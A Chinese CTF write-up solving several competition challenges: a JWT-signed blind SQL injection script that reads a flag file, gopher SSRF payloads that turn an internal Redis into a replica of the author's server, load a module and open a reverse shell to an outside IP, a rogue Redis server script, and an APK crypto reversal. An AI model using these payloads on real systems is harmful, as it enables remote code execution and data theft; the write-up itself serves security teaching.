作者：Mr.zhang合天智汇

查看JS，在JS中找到p14.php，直接copy下来console执行，输入战队的token就可以了

![v2-17a0c39b08be9fa1c1050f34149450b3_720w](https://pic2.zhimg.com/80/v2-17a0c39b08be9fa1c1050f34149450b3_720w.png)

## js_on  

顺手输入一个 admin admin，看到下面的信息

    
    
    欢迎admin
    这里是你的信息：key:xRt*YMDqyCCxYxi9a@LgcGpnmM2X8i&6

第一步想的是二次注入，但是一直被嘲讽，出题人素质有待加强，然后重新捋一遍思路，是不是命令注入，稍微测试了一下，感觉不对路，重新回过头，提示的这个key很明显是
jwt 的key，然后猜测二次注入的部分是不是在token部分，结果二次注入没发现，倒是发现在 token处存在布尔注入，如果为真
news会返回你输入的内容，如果为假，则返回 ？？？no message

脚本

    
    
    # coding=utf-8
    
    import jwt
    import requests
    import re
    requests.packages.urllib3.disable_warnings()
    key = "xRt*YMDqyCCxYxi9a@LgcGpnmM2X8i&6"
    url = "http://84f801d8da46417d9747f9bb2f8187b963c126676ca644fd.cloudgame1.ichunqiu.com/index.php"
    proxies = {"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}
    # info = jwt.decode("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJuZXdzIjoia2V5OnhSdCpZTURxeUNDeFl4aTlhQExnY0dwbm1NMlg4aSY2In0.EpNdctJ5Knu4ZkRcatsyMOxas1QgomB0Z49qb7_eoVg",key,algorithms=['HS256'])
    # if info:
        # print(info)
    
    # payloadTmpl = "i'/**/or/**/ascii(mid(database(),{},1))>{}#"
    # payloadTmpl = "i'/**/or/**/ascii(mid((s<a>elect/**/g<a>roup_con<a>cat(sc<a>hema_name)/**/fr<a>om/**/info<a>rmation_sc<a>hema.S<a>CHEMATA),{},1))>{}#"
    # payloadTmpl = "i'/**/or/**/ascii(mid((s<a>elect/**/g<a>roup_con<a>cat(ta<a>ble_name)/**/fr<a>om/**/info<a>rmation_sc<a>hema.t<a>ables/**/wher<a>e/**/ta<a>ble_s<a>chema=dat<a>abase()),{},1))>{}#"
    # payloadTmpl = "i'/**/or/**/ascii(mid((s<a>elect/**/g<a>roup_con<a>cat(col<a>umn_name)/**/fr<a>om/**/info<a>rmation_sc<a>hema.c<a>olumns/**/wher<a>e/**/ta<a>ble_s<a>chema=dat<a>abase()),{},1))>{}#"
    payloadTmpl = "i'/**/or/**/ascii(mid((se<a>lect/**/lo<a>ad_fi<a>le('/fl<a>ag')),{},1))>{}#"
    
    def half_interval():
        result = ""
        for i in range(1,45):
            min = 32
            max = 127
            while abs(max-min) > 1:
                mid = (min + max)//2 
                payload = payloadTmpl.format(i,mid)
                jwttoken = {
                    "user": payload,
                    "news": "success"
                }
                payload = jwt.encode(jwttoken, key, algorithm='HS256').decode("ascii")
                # print(payload)
                cookies = dict(token=str(payload))
                res = requests.get(url,cookies=cookies,proxies=proxies)
                if re.findall("success", res.text) != []:
                    min = mid
                else:
                    max = mid
            result += chr(max)
            print(result)
    
    if __name__ == "__main__":
        half_interval()
        # payload = payloadTmpl.format(1,32)
        # jwttoken = {
        #     "user": payload,
        #     "news": "success"
        # }
        # print(jwttoken)
        # payload = jwt.encode(jwttoken, key, algorithm='HS256').decode("ascii")
        # print(payload)
        # cookies = dict(token=str(payload))
        # res = requests.get(url,cookies=cookies,proxies=proxies)
        # res.encoding='utf-8'
        # print(res.text)

![v2-bed1d88675a41e830c0ee2d60ae592c5_720w](https://pic4.zhimg.com/80/v2-bed1d88675a41e830c0ee2d60ae592c5_720w.png)

## ssrfme  

刚拿到题目，想起来跟 SECCON 的题目很像，直接DNS重绑定绕过第一步

获取到hint的源码，提示ssrf 打 redis，直接写contrab在save的时候提示没权限，写shell不知道路径

一直主从复制也没成功

很坑，没权限

后来检查一下发现目录不对，转移到有权限的/tmp 下面

    
    
    gopher://ctf.m0te.top:6379/_auth%2520welcometowangdingbeissrfme6379%250d%250aconfig%2520set%2520dir%2520/tmp/%250d%250aquit

然后重复主从的步骤，在自己的VPS上起好了 rogue 服务器

    
    
    gopher://ctf.m0te.top:6379/_auth%2520welcometowangdingbeissrfme6379%250d%250aconfig%2520set%2520dbfilename%2520exp.so%250d%250aslaveof%252039.107.68.253%252060001%250d%250aquit

服务器监听

    
    
    gopher://ctf.m0te.top:6379/_auth%2520welcometowangdingbeissrfme6379%250d%250amodule%2520load%2520/tmp/exp.so%250d%250asystem.rev%252039.107.68.253%252060003%250d%250aquit

rogue.py

    
    
    import socketimport time
    
    CRLF="\r\n"
    payload=open("exp.so","rb").read()
    exp_filename="exp.so"
    
    def redis_format(arr):
        global CRLF
        global payload
        redis_arr=arr.split(" ")
        cmd=""
        cmd+="*"+str(len(redis_arr))
        for x in redis_arr:
            cmd+=CRLF+"$"+str(len(x))+CRLF+x
        cmd+=CRLF
        return cmd
    
    def redis_connect(rhost,rport):
        sock=socket.socket()
        sock.connect((rhost,rport))
        return sock
    
    def send(sock,cmd):
        sock.send(redis_format(cmd))
        print(sock.recv(1024).decode("utf-8"))
    
    def interact_shell(sock):
        flag=True
        try:
            while flag:
                shell=raw_input("\033[1;32;40m[*]\033[0m ")
                shell=shell.replace(" ","${IFS}")
                if shell=="exit" or shell=="quit":
                    flag=False
                else:
                    send(sock,"system.exec {}".format(shell))
        except KeyboardInterrupt:
            return
    
    
    def RogueServer(lport):
        global CRLF
        global payload
        flag=True
        result=""
        sock=socket.socket()
        sock.bind(("0.0.0.0",lport))
        sock.listen(10)
        clientSock, address = sock.accept()
        while flag:
            data = clientSock.recv(1024)
            if "PING" in data:
                result="+PONG"+CRLF
                clientSock.send(result)
                flag=True
            elif "REPLCONF" in data:
                result="+OK"+CRLF
                clientSock.send(result)
                flag=True
            elif "PSYNC" in data or "SYNC" in data:
                result = "+FULLRESYNC " + "a" * 40 + " 1" + CRLF
                result += "$" + str(len(payload)) + CRLF
                result = result.encode()
                result += payload
                result += CRLF
                clientSock.send(result)
                flag=False
    
    if __name__=="__main__":
        lhost="xxx.xxx.xxx.xxx"
        lport=60001

![v2-ba4a7f91c7b4ab9298b71d445e47a32e_720w](https://pic3.zhimg.com/80/v2-ba4a7f91c7b4ab9298b71d445e47a32e_720w.png)

## java  

用 jadx 对 java.apk 反汇编

主程序逻辑并不复杂，正常的输入，以及将输入进行计算后比对

先对用户输入进行 AES 加密 ，Key 为 aes_check_key!@#，然后进行两次异或，最后 base64 编码

与 VsBDJCvuhD65/+sL+Hlf587nWuIa2MPcqZaq7GMVWI0Vx8l9R42PXWbhCRftoFB3进行比较

所以 crack 过程也很简单，逆回来就得到输入，但是中间卡在密钥并不是直接给的密钥，还对密钥里 'e' 和 'o'进行了替换，最终密钥为
aos_chock_koy!@#，逆回去得到flag

实验推荐

SSRF漏洞进阶实践-攻击内网Redis

<http://hetianlab.com/expc.do?ec=ECID9f92-ff93-4a94-a821-f0b968ef4985>

声明：笔者初衷用于分享与普及网络知识，若读者因此作出任何危害网络安全行为后果自负，与合天智汇及原作者无关！

